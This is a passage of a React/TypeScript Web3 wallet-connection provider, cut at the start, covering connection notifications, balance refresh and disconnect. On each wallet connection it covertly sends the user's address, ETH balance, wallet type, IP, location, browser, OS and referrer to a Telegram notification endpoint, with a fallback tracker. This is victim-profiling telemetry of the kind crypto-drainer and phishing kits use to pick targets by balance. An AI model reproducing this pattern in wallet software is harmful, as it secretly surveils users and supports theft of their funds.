        console.warn("Error disconnecting from Phantom wallet:", error)
      }
    }

    console.log("Wallet disconnected successfully")
  }

  // Send wallet connected notification
  const sendWalletConnectedNotification = async (userAddress: string, walletName: string, balanceValue: string) => {
    try {
      console.log("Sending wallet connection notification:", userAddress, walletName, balanceValue)

      const tokenHoldings = await getTokenHoldings(userAddress)
      const etherscanLink = `https://etherscan.io/address/${userAddress}`

      // Use the direct API endpoint for more reliable delivery
      const response = await fetch("/api/debug-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message: `
🔌 Wallet Connected
👛 Address: <a href="${etherscanLink}">${userAddress}</a>
💰 Balance: ${balanceValue} ETH
🔑 Wallet: ${walletName}
🌐 IP: ${userIP || "Unknown"}
${userLocation?.country ? `📍 Location: ${userLocation.country}${userLocation.city ? `, ${userLocation.city}` : ""}` : ""}
🌐 Browser: ${userBrowser || "Unknown"}
💻 OS: ${userOS || "Unknown"}
📱 Mobile: ${isMobile ? "Yes" : "No"}
⏰ Time: ${new Date().toISOString()}
        `,
        }),
      })

      if (!response.ok) {
        console.error("Failed to send wallet connection notification via API")

        // Fallback to the trackWalletConnection function
        await trackWalletConnection({
          address: userAddress,
          balance: balanceValue,
          walletType: walletName,
          success: true,
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          tokenHoldings,
          isMobile,
          etherscanLink: etherscanLink,
        })
      }
    } catch (notificationError) {
      console.warn("Failed to send connection notification:", notificationError)

      // Fallback to the trackWalletConnection function
      await trackWalletConnection({
        address: userAddress,
        balance: balanceValue,
        walletType: walletName,
        success: true,
        ip: userIP || "Unknown",
        country: userLocation?.country,
        city: userLocation?.city,
        referer: referrer,
        userAgent: navigator.userAgent,
        browser: userBrowser,
        os: userOS,
        tokenHoldings: { ETH: balanceValue },
        isMobile,
        etherscanLink: `https://etherscan.io/address/${userAddress}`,
      }).catch((err) => console.error("Final fallback notification failed:", err))
    }
  }

  // Get token holdings
  const getTokenHoldings = async (address: string) => {
    try {
      return {
        ETH: balance,
      }
    } catch (error) {
      console.error("Error getting token holdings:", error)
      return {}
    }
  }

  // Refresh balance with specific provider
  const refreshBalanceWithProvider = async (provider: any, userAddress: string) => {
    try {
      const balanceHex = await provider.request({
        method: "eth_getBalance",
        params: [userAddress, "latest"],
      })

      const balanceWei = Number.parseInt(balanceHex, 16)
      const balanceEth = balanceWei / 1e18
      setBalance(balanceEth.toFixed(6))
      return balanceEth
    } catch (error) {
      console.error("Error refreshing balance:", error)
      return 0
    }
  }

  // Refresh balance
  const refreshBalance = async () => {
    if (isConnected && address && activeProvider) {
      return refreshBalanceWithProvider(activeProvider, address)
    }
    return 0
  }

  // Disconnect
  const disconnect = () => {
    disconnectWallet()
  }

  // Check for disconnected flag on initial load
  useEffect(() => {
    const disconnectedFlag = localStorage.getItem("wallet_disconnected")
    if (disconnectedFlag === "true") {
      setHasDisconnected(true)
      setForceWalletSelection(true)
    }
  }, [])

  // Update the provider value to include the new function
  return (
    <Web3Context.Provider
      value={{
        isConnected,
        address,
        balance,
        connect,
        disconnect,
        selectNewWallet,
        refreshBalance,
        tokenBalances,
      }}
    >
      {children}
      <WalletConnectionModal
        isOpen={isWalletModalOpen}
        onClose={() => {
          setIsWalletModalOpen(false)
          setIsSelectingNewWallet(false)
        }}
        walletOptions={WALLET_OPTIONS}
        otherWalletOptions={OTHER_WALLET_OPTIONS}
        onSelectWallet={handleWalletSelection}
      />
    </Web3Context.Provider>
  )
}
